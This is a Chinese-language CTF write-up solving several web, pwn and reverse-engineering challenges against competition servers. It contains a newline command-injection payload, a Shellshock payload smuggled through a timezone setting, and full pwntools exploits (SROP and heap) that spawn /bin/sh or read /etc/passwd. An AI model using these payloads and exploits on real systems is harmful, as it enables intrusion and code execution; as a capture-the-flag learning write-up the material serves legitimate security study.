# WEB 100

**题目名: where is my cat**

这题出的没啥意义，没学到东西..

```
$ curl -v https://106.75.34.78  --insecure
....
subject: C=CN,ST=Beijing,O=ichunqiu,OU=ichunqiu,CN=where_is_my_cat.ichunqiu.com,EMAIL=ctf@ichunqiu.com
....
```

这题卡的挺久的，之后脑洞一开，

`Cookie: Host=where_is_my_cat.ichunqiu.com`

```
$ curl -v https://106.75.34.78  --insecure -H "Cookie: HOST=where_is_my_cat.ichunqiu.com"
......
flag{e5775890-2420-11e7-af19-000c29cb5c9e}
```

getflag

# WEB 150

**题目名：写一写 看一看**

跟HITCON 2015 babyfirst差不多

参考: <http://wps2015.org/drops/drops/HITCON%20CTF%202015%20Quals%20Web%20%E5%87%BA%E9%A1%8C%E5%BF%83%E5%BE%97.html>

测试发现wget不行

然后使用tar

payload1: <http://106.75.34.78:2081/exec.php?shell[]=aa%0a&shell[]=mkdir&shell[]=aklissss>
payload2: <http://106.75.34.78:2081/exec.php?shell[]=a%0A&shell[]=tar&shell[]=cvf&shell[]=aklisssspathaklis666666&shell[]=pathvarpathwwwpathhtml>

在没有cookie的情况下`path` -> `/`

然后访问: <http://106.75.34.78:2081/tmp/aklissss/aklis666666>

把压缩包下载下来

得到`flag.php`:
```
<?php
$flag = "flag{f3dc16b9-5f6f-45fb-a054-d179628ef5bb}";
?>
```

# WEB 250

**题目名：mail**

PS: 这题体验非常糟糕，因为选手之间都是使用admin/admin登入，用户之间没有隔离，然后option.php 那页又存在xss，然后有段时间有人搅屎，把我浏览器直接搞挂，根本没法打开option.php

这题有源码: web.tar.gz

然后就是审计了

```
# send.php
mail($to,$subject,$message,$headers);
```

因为只有4个参数，所以不是phpmailer的那个漏洞

继续审计，发现
```
# config.php
$timezone = getConfig('timezone');
if($timezone != "")
{
  putenv("TZ=$timezone");
}else{
  putenv("TZ=Asia/Shanghai");
}
```

```
# function.php
function saveConfig($config){
   global $conn;
   foreach ($config as $key => $value) {
      $key = addslashes_deep($key);
      $strsql="select db_value from config where db_name='$key' limit 1"; 
      $result=mysql_query($strsql,$conn);
      $row = mysql_fetch_array($result);
      if(empty($row))
      {
         $strsql="insert into config(db_name,db_value) values('$key','$value')"; 
         $result=mysql_query($strsql,$conn);
      }else{
         $strsql="update config set db_value='$value' where db_name='$key'"; 
         $result=mysql_query($strsql,$conn);
      }
   }
}

function getConfig($key){
   global $conn;
   $strsql="select db_value from config where db_name='$key' limit 1"; 
   $result=mysql_query($strsql,$conn);
   $row = mysql_fetch_array($result);
   if(!empty($row))
   {
     return $row['db_value'];
   }
   return "";
}
```

所以我可以通过
```
config[root_path]=/var/www/html&config[send_mail]=hhhhh@qq.com&config[timezone]=xxxx
```

来控制`putenv`

想起以前看过p神的一篇blog: <https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html>

利用bash破壳漏洞

这就简单了

payload1: 
```
POST /options.php?action=save HTTP/1.1

Host: 106.75.106.156

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://106.75.106.156/options.php

Cookie: PHPSESSID=od8vs157dihd8m47o1fauhs232

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Content-Type: application/x-www-form-urlencoded

Content-Length: 145



config[root_path]=/var/www/html&config[send_mail]=hhhhh@qq.com&config[timezone]=() { x; }; cat flag.php >/var/www/html/upload/abcdef2.html 2>%261
```

payload2: 
```
POST /add.php?action=add HTTP/1.1

Host: 106.75.106.156

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://106.75.106.156/add.php

Cookie: PHPSESSID=od8vs157dihd8m47o1fauhs232

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Content-Type: application/x-www-form-urlencoded

Content-Length: 46



email=aaa%40test.com&title=aaaa&content=+bbbbb
```

payload3:
```
GET /send.php?id=43574 HTTP/1.1

Host: 106.75.106.156

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://106.75.106.156/

Cookie: PHPSESSID=od8vs157dihd8m47o1fauhs232

Connection: keep-alive

Upgrade-Insecure-Requests: 1
```

然后访问：<http://106.75.106.156/upload/abcdef2.html> 得到flag

```
<?php 
#flag{5867e627-289f-45e2-9a66-22ee8b68eb46}
```

# 签到1

忘了选几了，反正flag{A}, flag{B}, flag{C}, flag{D}一个一个试

# 签到2

同上，爆破出来的

# PWN 300

这题还是不错的，一个很好的学习SROP的题目

参考：<http://www.freebuf.com/articles/network/87447.html>

最开始其实是准备直接系统调用`execve`, 但是本地成功远程失败，猜测是服务端ban了execve，准备使用open

但是使用shellcode的时候竟然可以使用execve了？？？？？？题目环境中途改了？

payload:
```
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.clear()
context.arch = "amd64"
context.terminal = ['terminator', '-x', 'bash', '-c']
#  context.log_level = "debug"

frame = SigreturnFrame(kernel="amd64")
frame.rax = constants.SYS_read
frame.rdi = constants.STDIN_FILENO
frame.rdx = 0x400
frame.rip = 0x00000000004000be

#p = process("smallest")
p = remote("106.75.61.55", 20000)

p.send(p64(0x4000b0)+p64(0x00000000004000bb)+p64(0x4000b0))

# gdb.attach(p)
raw_input()
p.send("\xbb")
raw_input()
leak = p.recv()
print hex(u64(leak[16:24]))
frame.rsp = u64(leak[16:24]) - 0x1000
frame.rsi = u64(leak[16:24]) - 0x1000
p.send(p64(0x4000b0)+p64(0x4000be)+str(frame))
raw_input()
p.send(p64(0x4000be)+"\x00"*7)
raw_input()

shellcode_addr = 0x400000
shellcode = "hrve\x01\x814$\x01\x01\x01\x01H\xb8/etc/pasPj\x02XH\x89\xe71\xf6\x99\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05" # cat /etc/passwd
shellcode = "jhH\xb8/bin///sPj;XH\x89\xe71\xf6\x99\x0f\x05" # sh
frame.rax = constants.SYS_mprotect
frame.rdi = shellcode_addr
frame.rsi = 0x1000
frame.rdx = 7
p.send(p64(0x4000b0)+p64(0x4000be)+str(frame))
raw_input()
p.send(p64(0x4000be)+"\x00"*7)
raw_input()
frame.rax = constants.SYS_read
frame.rdi = constants.STDIN_FILENO
frame.rsi = 0x400100
frame.rdx = 100
p.send(p64(0x4000b0)+p64(0x4000be)+str(frame))
raw_input()
p.send(p64(0x4000be)+"\x00"*7)
raw_input()
p.send(shellcode)
raw_input()
p.send(p64(0x400100))
p.interactive()
```



# PWN 350

hitcon 2016 babyheap的题

参考：<http://shift-crops.hatenablog.com/entry/2016/10/11/233559#Babyheap-Pwn-300>

payload:
```
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
mode = 'remote'
# mode = 'local'
if mode == 'local':
   R = process('hiddenlove')
else:
   R = remote('106.75.84.68',20000)

R.recvuntil('4.Just throw yourself at her feet\n')
def alloc(length,word,name):
   R.sendline('1')
   R.recvuntil('how many words do you wanna say with her(0~1000)')
   R.send('%d\n'%length)
   R.recvuntil('write what you wanna to say with her')
   R.send(word)
   R.recvuntil('now tell me her name')
   R.send(name)
   R.recvuntil('4.Just throw yourself at her feet\n')

def edit(word):
   R.sendline('2\n\x00')
   R.recvuntil('Don\'t be shy, make her know your feelings')
   R.send(word)
   R.recvuntil('4.Just throw yourself at her feet\n')

def free():
   R.sendline('3')
   R.recvuntil('4.Just throw yourself at her feet\n')

def malloc(size):
   R.sendline('4')
   R.recvuntil('(Y/N)')
   R.send('N'+'\x00'*(size-1)+'\x50'+'\x00')
context.log_level='debug'
printf_addr = 0x4006F0
alarm_addr = 0x400700
exit_addr = 0x400760
atoi_addr = 0x400740
read_addr = 0x602048

malloc(0xfe8)
R.recvuntil('4.Just throw yourself at her feet\n')
alloc(0x80,'a'*8+p64(0x91)+p64(0)+p64(0x21),p64(0x50))
free()
alloc(0x40,'1'*0x30+p64(0x602060),'aaa')
edit(p64(printf_addr)+p64(0)+p64(alarm_addr))
R.send('%7$s'+'\x00'*4+p64(read_addr))
read_addr = int(R.recv(6)[::-1].encode('hex'),16)
print 'read_add: %lx'%read_addr
if mode == 'remote':
   elf = ELF('./libc.so.6')
else:
   elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_addr = read_addr-elf.symbols['read']
system_addr = libc_addr+elf.symbols['system']
print 'libc_addr: %lx'%libc_addr
print 'system_addr: %lx'%system_addr
edit(p64(system_addr))

R.send('/bin/sh\x00')
R.interactive()
```

# RE 150

payload:
```
mapv={}
rev={}
def get_random():
    global mapv
    global rev
    num_list=[]
    num_list2=[]
    ite = 0x1234567
    mul = 0x3B9ACA07
    pus = 0x3B9ACA09
    for i in range(1014):
        num_list2=[]
        for j in range(i+1):
            ite = ((ite*mul+pus)&0xffffffff)%0x989677
            num_list2.append(ite)
        for j in range(i+1,1015):
            num_list2.append(0)
        num_list.append(num_list2)
    s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    chr_list = []
    for x in s:
        chr_list.append(x)
    for i in range(0,64):
        ite = ((ite*mul+pus)&0xffffffff)%0x989677
        tmp = chr_list[i]
        chr_list[i] = chr_list[i+ite%(64-i)]
        chr_list[i+ite%(64-i)] = tmp
        mapv[chr_list[i]]=i
        rev[i] = chr_list[i]
    return num_list


Sum = 0x1BEBAAB51
a=get_random()
def max_path_sum(arr):
    global rev
    sel = 0
    seq = []
    for i in range(1,1014):
        a[i][0]+=a[i-1][0]
    for i in range(1,1014):
        for j in range(1,i+1):
            a[i][j] += max(arr[i-1][j],arr[i-1][j-1])
    Max = max(a[1013])
    print hex(Max)
    for i in range(len(a[1013])):
        if a[1013][i] == Max:
            for j in range(0,1013):
                if max(arr[1012-j][i],arr[1012-j][i-1]) == arr[1012-j][i]:
                    seq.append(0)
                else:
                    seq.append(1)
                    i-=1
            break
    seq.append(0)
    seq = seq[::-1]
    decode_value=[]
    d=0
    for k in range(0,1013):
        if seq[k]:
            d |= (32>>(k%6))
        if k%6 == 5:     
            decode_value.append(rev[d])
            d=0
    decode_value.append(rev[d]) 
    print ''.join(decode_value)
    return seq
    
def cal(s):
    global mapv
    add = 0
    q = 0
    path=[]
    for i in range(0,1014):
        if (mapv[s[i/6]]&(32>>(i%6)) != 0):
            path.append(1)
            add+=a[i][q+1]
        else:
            path.append(0)
            add+=a[i][q]
        q += (mapv[s[i/6]]&(32>>(i%6)) != 0)
    print hex(add)
    return path

s="IpEvtWVLK+N6NAZPKgf6IDtNK6PTR6vB4EEE8NcyJri1Gng+02nnAdTa0ufQNq23KGG3seTdIkhuBTubKZAPKEpEEYc9RqQlgkPmu0QBbNWLINSHlIWxXo0sXJtrZsCoApoe7pqMGANFpFEzEp6I6tDpwsHD0KRAZXKN/d/sC"
print len(cal(s))
print len(max_path_sum(a))
```



